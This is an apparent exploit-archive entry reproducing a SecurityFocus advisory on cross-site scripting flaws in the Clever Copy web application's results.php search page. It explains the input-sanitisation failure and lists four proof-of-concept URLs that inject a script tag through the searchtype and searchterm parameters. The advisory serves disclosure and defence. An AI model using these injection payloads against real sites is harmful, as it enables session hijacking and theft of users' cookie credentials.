@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/14395/info
+
+Clever Copy is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker may leverage any of these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://www.example.com/results.php?searchtype="><script>XSS</script>category&searchterm=Announcements
+http://www.example.com/results.php?searchtype=category&searchterm="><script>XSS</script>Announcements
+http://www.example.com/results.php?start=0&searchtype="><script>XSS</script>category&searchterm=Announcements
+http://www.example.com/results.php?start=0&searchtypecategory&searchterm=Announcements="><script>XSS</script>
